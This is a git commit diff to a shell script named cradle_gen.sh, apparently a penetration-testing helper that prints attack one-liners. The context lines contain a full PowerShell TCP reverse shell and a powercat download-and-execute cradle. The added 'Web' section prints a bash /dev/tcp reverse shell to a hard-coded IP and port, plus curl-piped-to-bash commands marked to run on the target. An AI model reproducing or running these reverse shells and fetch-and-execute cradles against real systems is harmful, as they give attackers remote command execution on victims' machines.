3a3274ccaa53bef43fc880ea56b9b27a525c19c4
Mojo8898 <zmewshaw@gmail.com>
2024-02-11 15:11:03 -0500

    Added web cradles

--- cradle_gen.sh
+++ cradle_gen.sh
@@ -21,6 +21,12 @@ powercat="IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/p
 ps_shell="\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 
 # Cradles
+echo -e "\n<== Web ==>\n"
+echo -e "echo '/bin/sh -i >& /dev/tcp/192.168.45.221/9001 0>&1' > shell.sh\n"
+echo -e "ON TARGET: curl <OUR_IP>/shell.sh | /bin/bash\n"
+echo "ON TARGET: curl <OUR_IP>/shell.sh -o /tmp/shell.sh"
+echo "ON TARGET: /bin/bash /tmp/shell.sh"
+
 echo -e "\n<== Bash ==>\n"
 echo -e "bash -c \"$bash_shell\"\n"
 echo -e "echo '$(echo -n $bash_shell | base64 -w 0)' | base64 -d | bash\n"
